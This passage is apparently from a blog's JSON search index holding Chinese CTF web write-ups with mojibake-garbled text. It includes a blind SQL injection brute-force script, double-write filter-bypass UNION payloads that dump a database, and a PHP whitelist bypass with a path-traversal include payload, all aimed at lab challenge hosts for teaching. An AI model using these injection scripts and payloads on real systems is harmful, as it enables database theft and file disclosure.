&#39;CURRENT_TRANSFORM_GROUP_FOR_TYPE&#39;, &#39;CURSOR&#39;, &#39;DELETE&#39;, &#39;END-EXEC&#39;, &#39;FLOOR&#39;, &#39;FOR&#39;, &#39;FOREIGN&#39;, &#39;GROUP&#39;, &#39;GROUPING&#39;, &#39;GROUPS&#39;, &#39;IMPORT&#39;, &#39;INDICATOR&#39;, &#39;INSERT&#39;, &#39;INTO&#39;, &#39;LIMIT&#39;, &#39;NORMALIZE&#39;, &#39;OR&#39;, &#39;ORDER&#39;, &#39;PORTION&#39;, &#39;UNION&#39;, &#39;UPDATE&#39;, &#39;XMLFOREST&#39;] 3.åˆ¤æ–­æ³¨å…¥æ–¹å¼(ç›²æ³¨)unionè¢«è¿‡æ»¤ï¼Œè”åˆæŸ¥è¯¢ä¸è¡Œï¼Œç»•è¿‡æœ‰ç‚¹å›°éš¾ï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿæœ‰ç‚¹å›°éš¾ï¼Œç›²æ³¨and ,or ç­‰è¢«è¿‡æ»¤ï¼Œifæ²¡è¢«è¿‡æ»¤ï¼Œselectä¹Ÿå¯ä»¥ç”¨ï¼Œé¢˜ç›®å‘ŠçŸ¥äº†æˆ‘ä»¬è¡¨åå’Œå­—æ®µåï¼Œæ‰€ä»¥å¯ä»¥ç”¨ifè¿›è¡Œç›²æ³¨ï¼Œå› ä¸ºæ˜¯æ•°å€¼å‹æ³¨å…¥ï¼Œæ‰€ä»¥ifæ¡ä»¶å¥ç›´æ¥ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œå°±ä¸ç”¨andå’Œoräº†ï¼Œç½‘ä¸Šä¹Ÿçœ‹åˆ°æœ‰å¤§ä½¬ç”¨å¼‚æˆ–^æ¥ä»£æ›¿orè¿›è¡Œç›²æ³¨ï¼Œå¦‚0^if(â€¦â€¦.),ä¸‹é¢ä»¥ifä¸ºä¾‹å­ è¿™é‡Œæ³¨æ„ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œ/**/ä¹Ÿè¢«è¿‡æ»¤ï¼Œç»•è¿‡æ–¹å¼ä¹Ÿå¾ˆå¤šï¼Œè¿™é‡Œä½¿ç”¨ï¼ˆï¼‰ payloadå¦‚if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0) 1234567891011121314151617import requestsflag = &quot;&quot;url = &quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;payload = &quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&quot;for i in range(1,300): for j in range(32,127): p = payload.format(i,j) data = &#123; &quot;id&quot;:p &#125; r = requests.post(url, data=data) if &quot;Hello&quot; in r.text: flag+=chr(j) print(flag)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL","slug":"æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL","date":"2021-01-15T14:48:25.000Z","updated":"2021-09-22T09:59:21.741Z","comments":true,"path":"2021/01/15/æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL/","link":"","permalink":"https://123-prog.github.io/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/","excerpt":"1.å¯»æ‰¾æ³¨å…¥ç‚¹getå‹æ³¨å…¥ï¼Œåœ¨passwordå¤„å¯è¿›è¡Œæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥åˆ¤æ–­é—­åˆç±»å‹ä¸ºå•å¼•å·é—­åˆ","text":"1.å¯»æ‰¾æ³¨å…¥ç‚¹getå‹æ³¨å…¥ï¼Œåœ¨passwordå¤„å¯è¿›è¡Œæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥åˆ¤æ–­é—­åˆç±»å‹ä¸ºå•å¼•å·é—­åˆ 2.é¢˜ç›®è¯´è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å•¥é¢˜ç›®çš„è¿‡æ»¤æ–¹å¼å¾ˆç®€å•ï¼Œå°±ç›´æ¥replaceä¸ºç©ºï¼Œåœ¨passwordä¸­å‡ºç°or,æŠ¥é”™æ—¶orä¼šè¢«â€åâ€œæ‰ï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºæ¥,è·‘ä¸€è·‘çœ‹è¿‡æ»¤äº†ä»€ä¹ˆå…³é”®å­— 123456789101112# -*- coding: utf-8 -*-import requestsurl = &quot;http://0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn/check.php?username=admin&amp;password=12345&#x27;&#123;&#125;&quot;f = open(&quot;./sqlå…³é”®å­—å­—å…¸.txt&quot;)for line in f: url1 = url.format(line) r = requests.get(url1) if &quot;12345&quot; in r.text: print(line)f.close() ç»“æœå¾—å‡ºè¿‡æ»¤æ‰çš„å…³é”®å­—and , by, char, drop, from, having, insert, into, or, select, union, where 3.åŒå†™ç»•è¿‡æ³¨å…¥payload: 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,3%23 çˆ†æ•°æ®åº“ 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23 æŸ¥æ‰¾ä¹‹åå‘ç°flagåœ¨ctfæ•°æ®åº“ä¸­ çˆ†è¡¨å 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;ctf&#39;%23 çˆ†å­—æ®µ 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;&#39;ctf&#39;anandd table_name&#x3D;&#39;Flag&#39;%23 æŸ¥è¯¢å­—æ®µå€¼å¾—åˆ°flag 1http:&#x2F;&#x2F;0eada43c-3dc0-4470-9708-25780d29481d.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;12345%27 ununionion seselectlect 1,2,flag frfromom ctf.Flag%23","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"HCTF 2018 Warmup","slug":"HCTF-2018-Warmup","date":"2021-01-14T10:31:03.000Z","updated":"2021-09-22T09:58:12.981Z","comments":true,"path":"2021/01/14/HCTF-2018-Warmup/","link":"","permalink":"https://123-prog.github.io/2021/01/14/HCTF-2018-Warmup/","excerpt":"ç®€å•çš„ä»£ç å®¡è®¡é¢˜ç›®ï¼Œä¸»è¦éœ€è¦æ³¨æ„å‡ ä¸ªç‚¹ æºç å¦‚ä¸‹","text":"ç®€å•çš„ä»£ç å®¡è®¡é¢˜ç›®ï¼Œä¸»è¦éœ€è¦æ³¨æ„å‡ ä¸ªç‚¹ æºç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; checkFileå‡½æ•°æ²¡æœ‰å¯¹æˆ‘ä»¬çš„fileå‚æ•°åšè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥åªè¦ç¬¦åˆcheckFileå‡½æ•°ä¸­çš„ä¸‰æ¬¡ç™½åå•æ£€éªŒä¸­çš„ä¸€æ¬¡å°±å¯ä»¥åˆ©ç”¨includeåŒ…å«æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ 12345678$_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; ç¬¬ä¸€æ¬¡æ£€éªŒå¾ˆç®€å•ï¼Œåªè¦æ„é€ file=source.php?åé¢æ¥æˆ‘ä»¬çš„è·¯å¾„ï¼Œå°±å¯ä»¥ç»•è¿‡ä¸€æ¬¡ç™½åå•æ£€éªŒè®©æ£€æŸ¥å‡½æ•°è¿”å›trueï¼Œä½†è¿™æœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œwindowsç¯å¢ƒä¸å…è®¸å­˜åœ¨å¸¦ï¼Ÿçš„è·¯å¾„ï¼Œæ‰€ä»¥å¦‚æœåœ¨windowsç¯å¢ƒä¸‹ï¼Œéœ€è¦åˆ©ç”¨æ¥ä¸‹æ¥çš„é‚£æ¬¡ç™½åå•æ£€éªŒ 123456789$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; éœ€è¦è®©$pageåœ¨è¿›è¡Œurlè§£ç åå‡ºç°â€™ ? â€˜ï¼Œæ‰€ä»¥å¯¹ â€˜ ? â€™ è¿›è¡Œä¸¤æ¬¡çš„urlç¼–ç ï¼Œå¾—åˆ°%253fï¼Œç»è¿‡æµè§ˆå™¨çš„ä¸€æ¬¡è§£ç å˜æˆ%3fï¼Œå†ç»è¿‡ä»£ç çš„è§£ç å¾—åˆ°?ã€‚ ç»•è¿‡åå°±æ˜¯è€ƒè™‘æ–‡ä»¶åŒ…å« ç”±hint.phpçš„å†…å®¹ï¼Œflagåœ¨ffffllllaaaaggggä¸­ éwindowç¯å¢ƒå¯ä»¥è¿™æ ·æ„é€ payload ?file=source.php?/../ffffllllaaaagggg è¿™é‡Œincludeåœ¨åŒ…å«æ–‡ä»¶æ—¶ï¼Œsource.php?è¿™ä¸ªè·¯å¾„ä¸å­˜åœ¨ï¼Œ../è¿›è¡Œä¸€æ¬¡ç›®å½•ç©¿è¶Šï¼Œç›¸å½“äºåˆå›åˆ°å½“å‰ç›®å½•ï¼Œè¿™ä¸ªå°±ç›¸å½“äºåŒ…å«äº†å½“å‰ç›®å½•ä¸‹çš„ä¸€ä¸ªåä¸ºffffllllaaaaggggçš„æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±åªæ˜¯éœ€è¦å¾€ä¸Šæ‰¾è¿™ä¸ªæ–‡ä»¶çš„ä½ç½®ï¼Œæœ€ç»ˆçš„payload ?file=source.php?/../../../../ffffllllaaaagggg åœ¨windowsç¯å¢ƒä¸‹åªéœ€è¦æŠŠé—®å·æ¢æˆ%253få³å¯","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"","slug":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","date":"2021-01-14T03:51:00.000Z","updated":"2021-04-05T02:35:24.249Z","comments":true,"path":"2021/01/14/æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢/","link":"","permalink":"https://123-prog.github.io/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"","categories":[],"tags":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"},{"name":"nosql","slug":"CTF/nosql","permalink":"https://123-prog.github.io/categories/CTF/nosql/"},{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"golang web","slug":"CTF/golang-web","permalink":"https://123-prog.github.io/categories/CTF/golang-web/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"CTF/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"python web","slug":"CTF/python-web","permalink":"https://123-prog.github.io/categories/CTF/python-web/"}],"tags":[{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"https://123-prog.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"phpååºåˆ—åŒ–","slug":"phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"æ§åˆ¶é”™è¯¯ä¿¡æ¯","slug":"æ§åˆ¶é”™è¯¯ä¿¡æ¯","permalink":"https://123-prog.github.io/tags/%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/"},{"name":"order by æ— æŸ¥è¯¢æ•°æ® åŸºäºæ—¶é—´ç›²æ³¨","slug":"order-by-æ— æŸ¥è¯¢æ•°æ®-åŸºäºæ—¶é—´ç›²æ³¨","permalink":"https://123-prog.github.io/tags/order-by-%E6%97%A0%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"name":"caddy+php-fpmç›®å½•ç©¿è¶Š","slug":"caddy-php-fpmç›®å½•ç©¿è¶Š","permalink":"https://123-prog.github.io/tags/caddy-php-fpm%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"},{"name":"åˆ©ç”¨pearæ‰©å±•åº“å†™é©¬","slug":"åˆ©ç”¨pearæ‰©å±•åº“å†™é©¬","permalink":"https://123-prog.github.io/tags/%E5%88%A9%E7%94%A8pear%E6%89%A9%E5%B1%95%E5%BA%93%E5%86%99%E9%A9%AC/"},{"name":"nginxè·¯å¾„è§£æç»•è¿‡","slug":"nginxè·¯å¾„è§£æç»•è¿‡","permalink":"https://123-prog.github.io/tags/nginx%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87/"},{"name":"flightæ¡†æ¶ä»£ç å®¡è®¡","slug":"flightæ¡†æ¶ä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/flight%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","slug":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"javaååºåˆ—åŒ–","slug":"javaååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"javaåŠ¨æ€ä»£ç†çŸ¥è¯†","slug":"javaåŠ¨æ€ä»£ç†çŸ¥è¯†","permalink":"https://123-prog.github.io/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/"},{"name":"jsä»£ç å®¡è®¡","slug":"jsä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"zombie RCE","slug":"zombie-RCE","permalink":"https://123-prog.github.io/tags/zombie-RCE/"},{"name":"nosqlæ³¨å…¥","slug":"nosqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/nosql%E6%B3%A8%E5%85%A5/"},{"name":"æ‚è®°","slug":"æ‚è®°","permalink":"https://123-prog.github.io/tags/%E6%9D%82%E8%AE%B0/"},{"name":"pharååºåˆ—åŒ–","slug":"pharååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php://filterè¿‡æ»¤å™¨å·§å¦™åˆ©ç”¨","slug":"php-filterè¿‡æ»¤å™¨å·§å¦™åˆ©ç”¨","permalink":"https://123-prog.github.io/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"},{"name":"DAS x CBCTF","slug":"DAS-x-CBCTF","permalink":"https://123-prog.github.io/tags/DAS-x-CBCTF/"},{"name":"LightCMS åå°RCEæ¼æ´","slug":"LightCMS-åå°RCEæ¼æ´","permalink":"https://123-prog.github.io/tags/LightCMS-%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"ssrf","permalink":"https://123-prog.github.io/tags/ssrf/"},{"name":"é‡å®šå‘","slug":"é‡å®šå‘","permalink":"https://123-prog.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"},{"name":".htaccess","slug":"htaccess","permalink":"https://123-prog.github.io/tags/htaccess/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"flask sessionä¼ªé€ ","slug":"flask-sessionä¼ªé€ ","permalink":"https://123-prog.github.io/tags/flask-session%E4%BC%AA%E9%80%A0/"},{"name":"pickleååºåˆ—åŒ–","slug":"pickleååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pickle","slug":"pickle","permalink":"https://123-prog.github.io/tags/pickle/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"opcodeä½¿ç”¨","slug":"opcodeä½¿ç”¨","permalink":"https://123-prog.github.io/tags/opcode%E4%BD%BF%E7%94%A8/"},{"name":"pkerä½¿ç”¨","slug":"pkerä½¿ç”¨","permalink":"https://123-prog.github.io/tags/pker%E4%BD%BF%E7%94%A8/"},{"name":"å®¢æˆ·ç«¯session","slug":"å®¢æˆ·ç«¯session","permalink":"https://123-prog.github.io/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/"},{"name":"sessionä¼ªé€ ","slug":"sessionä¼ªé€ ","permalink":"https://123-prog.github.io/tags/session%E4%BC%AA%E9%80%A0/"},{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"},{"name":"Node 8.12.0çš„æ‹†åˆ†è¯·æ±‚æ”»å‡»ï¼ˆèµ°ç§ï¼‰","slug":"Node-8-12-0çš„æ‹†åˆ†è¯·æ±‚æ”»å‡»ï¼ˆèµ°ç§ï¼‰","permalink":"https://123-prog.github.io/tags/Node-8-12-0%E7%9A%84%E6%8B%86%E5%88%86%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB%EF%BC%88%E8%B5%B0%E7%A7%81%EF%BC%89/"},{"name":"zipä¼ªåè®®","slug":"zipä¼ªåè®®","permalink":"https://123-prog.github.io/tags/zip%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"åŒ…å«sessionæ–‡ä»¶getshell","slug":"åŒ…å«sessionæ–‡ä»¶getshell","permalink":"https://123-prog.github.io/tags/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6getshell/"},{"name":"ç•¸å½¢zip","slug":"ç•¸å½¢zip","permalink":"https://123-prog.github.io/tags/%E7%95%B8%E5%BD%A2zip/"},{"name":"nodejsä»£ç å®¡è®¡","slug":"nodejsä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/nodejs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Netflix Conductor 1day","slug":"Netflix-Conductor-1day","permalink":"https://123-prog.github.io/tags/Netflix-Conductor-1day/"},{"name":"Java BCEL ç¼–ç ","slug":"Java-BCEL-ç¼–ç ","permalink":"https://123-prog.github.io/tags/Java-BCEL-%E7%BC%96%E7%A0%81/"},{"name":"nodejsè¯·æ±‚èµ°ç§","slug":"nodejsè¯·æ±‚èµ°ç§","permalink":"https://123-prog.github.io/tags/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"name":"mysqlæ³¨å…¥","slug":"mysqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"Javaååºåˆ—åŒ–","slug":"Javaååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"getimagesizeç»•è¿‡","slug":"getimagesizeç»•è¿‡","permalink":"https://123-prog.github.io/tags/getimagesize%E7%BB%95%E8%BF%87/"},{"name":"mb_strtolower()çš„åˆ©ç”¨","slug":"mb-strtolower-çš„åˆ©ç”¨","permalink":"https://123-prog.github.io/tags/mb-strtolower-%E7%9A%84%E5%88%A9%E7%94%A8/"},{"name":"CISCN","slug":"CISCN","permalink":"https://123-prog.github.io/tags/CISCN/"},{"name":"SSRFæ”»å‡»php-fpm","slug":"SSRFæ”»å‡»php-fpm","permalink":"https://123-prog.github.io/tags/SSRF%E6%94%BB%E5%87%BBphp-fpm/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://123-prog.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"DASCTF","slug":"DASCTF","permalink":"https://123-prog.github.io/tags/DASCTF/"},{"name":"java web","slug":"java-web","permalink":"https://123-prog.github.io/tags/java-web/"},{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"phpå˜é‡è§£æ","slug":"phpå˜é‡è§£æ","permalink":"https://123-prog.github.io/tags/php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"},{"name":"http smugglings","slug":"http-smugglings","permalink":"https://123-prog.github.io/tags/http-smugglings/"},{"name":"http smuggling","slug":"http-smuggling","permalink":"https://123-prog.github.io/tags/http-smuggling/"},{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/tags/wp/"},{"name":"httpè¯·æ±‚å¤´","slug":"httpè¯·æ±‚å¤´","permalink":"https://123-prog.github.io/tags/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"md5ç»•è¿‡","slug":"md5ç»•è¿‡","permalink":"https://123-prog.github.io/tags/md5%E7%BB%95%E8%BF%87/"},{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/tags/%E5%85%B6%E4%BB%96/"}]}